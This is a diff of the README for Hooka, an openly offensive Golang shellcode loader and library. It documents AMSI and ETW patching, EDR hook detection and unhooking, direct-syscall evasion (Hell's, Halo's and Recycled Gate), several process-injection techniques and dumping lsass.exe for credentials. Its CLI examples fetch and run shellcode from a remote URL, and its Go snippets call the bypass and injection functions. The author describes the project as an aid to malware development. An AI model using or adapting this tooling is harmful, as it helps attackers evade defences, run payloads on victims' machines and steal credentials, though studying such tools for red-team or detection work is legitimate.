@@ -1,7 +1,7 @@
 <p align="center">
   <img src="assets/gopher.png" width="130" heigth="60" alt="Gopher"/>
   <h1 align="center">Hooka</h1>
-  <p align="center">~ Shellcode injector, hooks detector and more written in Golang ~</p>
+  <p align="center">~ Shellcode loader, hooks detector and more written in Golang ~</p>
 </p>
 
 <p align="center">
@@ -15,18 +15,18 @@
 
 # Introduction
 
-I started this project to create a powerful shellcode injector with a lot of malleable capabilities via CLI flags like detecting hooked functions, using Hells Gate technique and more. Why in Golang? Because it's a great language to develop malware and this project can help with it by providing an stable API with some functions which can be really useful.
+I started this project to create a powerful shellcode loader with a lot of malleable capabilities via CLI flags like detecting hooked functions, using Hell's and Galo's Gate techniques and more. Why in Golang? Because it's a great language to develop malware and this project can help with it by providing an stable API with some functions which can be really useful. If you have any question feel free to open an issue or whatever you want.
 
 However I've also taken some code from [BananaPhone](https://github.com/C-Sto/BananaPhone) and [Doge-Gabh](https://github.com/timwhitez/Doge-Gabh) projects (thanks a lot to ***C-Sto*** and ***timwhitez***)
 
 # Features
 
-- Inject shellcode from remote URL or local file
+- Get shellcode from remote URL or local file
 - Shellcode reflective DLL injection (***sRDI***)
 - ***AMSI*** and ***ETW*** patch
 - Detects hooked functions (i.e. NtCreateThread)
 - Compatible with base64 and hex encoded shellcode
-- Hell's Gate technique
+- Recycled Gate technique
 - Capable of unhooking functions via multiple techniques:
   - Classic unhooking
   - Full DLL unhooking
@@ -37,6 +37,7 @@ However I've also taken some code from [BananaPhone](https://github.com/C-Sto/Ba
   - Fibers
   - OpenProcess
   - EarlyBirdAPC
+  - UuidFromString
 
 - Dump lsass.exe process to a file
 - Windows API hashing (see [here](https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware))
@@ -64,35 +65,6 @@ git clone https://github.com/D3Ext/Hooka
 
 > Help panel
 ```
-  _   _                   _              _
- | | | |   ___     ___   | | __   __ _  | |
- | |_| |  / _ \   / _ \  | |/ /  / _` | | |
- |  _  | | (_) | | (_) | |   <  | (_| | |_|
- |_| |_|  \___/   \___/  |_|\_\  \__,_| (_)
- by D3Ext - v0.1
-
-  -b64
-        decode base64 encoded shellcode
-  -dll string
-        path to DLL you want to inject with function name sepparated by comma (i.e. evil.dll,xyz)
-  -file string
-        path to file where shellcode is stored
-  -hells
-        enable Hell's Gate technique to try to evade possible EDRs
-  -hex
-        decode hex encoded shellcode
-  -hooks
-        dinamically detect hooked functions by EDR
-  -lsass string
-        dump lsass.exe process memory into a file to extract credentials (run as admin)
-  -t string
-        shellcode injection technique: CreateRemoteThread, Fibers, OpenProcess, EarlyBirdApc (default: random)
-  -test
-        test shellcode injection capabilities by spawning a calc.exe
-  -unhook int
-        overwrite syscall memory address to bypass EDR : 1=classic, 2=full, 3=Perun's Fart
-  -url string
-        remote shellcode url (e.g. http://192.168.1.37/shellcode.bin)
 ```
 
 > Detect hooked functions by EDR (including false positives)
@@ -105,16 +77,16 @@ git clone https://github.com/D3Ext/Hooka
 .\Hooka.exe --test
 ```
 
-If no technique is especified it will use a random one
+- If no technique is especified it will use a random one
 
 > Inject shellcode from URL
 ```sh
-.\Hooka.exe -t CreateRemoteThread --url http://192.168.116.37/shellcode.bin
+.\Hooka.exe --url http://192.168.116.37/shellcode.bin
 ```
 
 > Inject shellcode from file
 ```sh
-.\Hooka.exe -t Fibers --file shellcode.bin
+.\Hooka.exe --file shellcode.bin
 ```
 
 > Decode shellcode from hex
@@ -127,14 +99,19 @@ If no technique is especified it will use a random one
 .\Hooka.exe --file shellcode.bin --b64
 ```
 
-> Inject shellcode using Hell's Gate
+> Use Hell's Gate + Halo's Gate to bypass AVs/EDRs
 ```sh
 .\Hooka.exe --url http://192.168.116.37/shellcode.bin --hells
 ```
 
 > Unhook function before injecting shellcode
 ```sh
-.\Hooka.exe -t OpenProcess --file shellcode.bin --unhook 3
+.\Hooka.exe --file shellcode.bin --unhook 3
+```
+
+> Patch AMSI
+```sh
+.\Hooka.exe --url http://192.168.116.37/shellcode.bin --amsi
 ```
 
 As you can see Hooka provides a lot of CLI flags to help you in all kind of situations
@@ -144,8 +121,11 @@ As you can see Hooka provides a lot of CLI flags to help you in all kind of situ
 > Detecting hooks
 <img src="assets/hooks.png">
 
-> Injecting shellcode via NtCreateThread
+> Injecting shellcode via CreateRemoteThread technique
 <img src="assets/crt.png">
+
+> Injecting shellcode using custom flags
+<img src="assets/custom.png">
 
 > Test function
 <img src="assets/test.png">
@@ -161,11 +141,13 @@ As you can see Hooka provides a lot of CLI flags to help you in all kind of situ
 
 :black_square_button: Better error handling
 
-:black_square_button: Test unhooking functions against some EDR
+:black_square_button: Integrated Seatbelt.exe using CLR
+
+:black_square_button: Test unhooking functions against EDRs
 
 # Library
 
-If you're looking to implement any function in your malware you can do it using the official package API:
+- If you're looking to implement any function in your malware you can do it using the official package API.
 
 > First of all download the package
 ```sh
@@ -185,14 +167,14 @@ import (
 
 func main(){
   // Returns all hooked functions
-  hooks, err := hooka.DetectHooks() // func DetectHooks() ([]string, error) {}
+  hooks, err := hooka.DetectHooks() // func DetectHooks() ([]string, error)
   if err != nil {
     log.Fatal(err)
   }
   fmt.Println(hooks)
 
   // Check if an especific function is hooked
-  check, err := hooka.IsHooked("NtCreateThread") // func IsHooked(funcname string) (bool, error) {}
+  check, err := hooka.IsHooked("NtCreateThread") // func IsHooked(funcname string) (bool, error)
   if err != nil {
     log.Fatal(err)
   }
@@ -223,13 +205,19 @@ func main(){
   }
 
   // Now use the procedure as loading it from dll
-  proc.Call()
+  r, err := hooka.Syscall(
+    proc,
+    arg1,
+    arg2,
+    arg3,
+    arg4,
+  )
 
   ...
 }
 ```
 
-> Apply AMSI and ETW patch
+> Apply AMSI and/or ETW patch
 ```go
 package main
 
@@ -242,7 +230,7 @@ import (
 
 func main(){
   // Amsi bypass
-  err := hooka.PatchAmsi(0) // Use 0 for own process
+  err := hooka.PatchAmsi()
   if err != nil {
     log.Fatal(err)
   }
@@ -254,6 +242,71 @@ func main(){
     log.Fatal(err)
   }
   fmt.Println("ETW bypassed!")
+}
+```
+
+> Get syscall id with Hell's Gate + Halo's Gate
+```go
+package main
+
+import (
+  "fmt"
+  "log"
+
+  "github.com/D3Ext/Hooka/pkg/hooka"
+)
+
+func main(){
+  // Get syscall id of function, only ntdll.dll is supported
+  sysId, err := hooka.GetSysId("NtCreateThread") // func GetSysId(funcname string) (uint16, error)
+  if err != nil {
+    log.Fatal(err)
+  }
+
+  fmt.Println("Syscall ID:", sysId)
+
+  r, err := hooka.Syscall( // Execute syscall
+    sysId,  // especify func
+    arg1,   // pass neccesary arguments
+    arg2,
+    arg3,
+    arg4,
+  )
+
+  if err != nil {
+    log.Fatal(err)
+  }
+
+  fmt.Println("Error code:", r)
+}
+```
+
+> Use shellcode injection techniques
+```go
+package main
+
+import (
+  "fmt"
+  "log"
+
+  "github.com/D3Ext/Hooka/pkg/hooka"
+)
+
+var calc_shellcode = []byte{}
+
+func main(){
+  err := hooka.Fibers(calc_shellcode)
+  if err != nil {
+    log.Fatal(err)
+  }
+  fmt.Println("Shellcode injected via Fibers")
+
+  err = hooka.CreateProcess(calc_shellcode)
+  if err != nil {
+    log.Fatal(err)
+  }
+  fmt.Println("Shellcode injected via CreateProcess")
+  
 }
 ```
 
@@ -269,16 +322,19 @@ import (
 )
 
 func main(){
+  // Use classic technique which overwrites 
   err := hooka.ClassicUnhook("NtCreateThread", "C:\\Windows\\System32\\ntdll.dll")
   if err != nil {
     log.Fatal(err)
   }
 
-  err = hooka.FullUnhook()
+  // This technique loads original ntdll.dll from disk into memory to restore all functions
+  err = hooka.FullUnhook("C:\\Windows\\System32\\ntdll.dll")
   if err != nil {
     log.Fatal(err)
   }
 
+  // Use modern Perun's Fart technique which 
   err = hooka.PerunsUnhook()
   if err != nil {
     log.Fatal(err)
@@ -300,13 +356,15 @@ See [CONTRIBUTING.md](https://github.com/D3Ext/Hooka/blob/main/CONTRIBUTING.md)
 https://github.com/C-Sto/BananaPhone
 https://github.com/timwhitez/Doge-Gabh
 https://github.com/Ne0nd0g/go-shellcode
-https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions#checking-for-hooks
-https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
+https://github.com/trickster0/TartarusGate
 https://github.com/Kara-4search/HookDetection_CSharp
 https://github.com/RedLectroid/APIunhooker
 https://github.com/plackyhacker/Peruns-Fart
+https://github.com/chvancooten/maldev-for-dummies
 https://blog.sektor7.net/#!res/2021/perunsfart.md
 https://teamhydra.blog/2020/09/18/implementing-direct-syscalls-using-hells-gate/
+https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions#checking-for-hooks
+https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
 https://www.ired.team/offensive-security/defense-evasion/retrieving-ntdll-syscall-stubs-at-run-time
 https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware
 ```
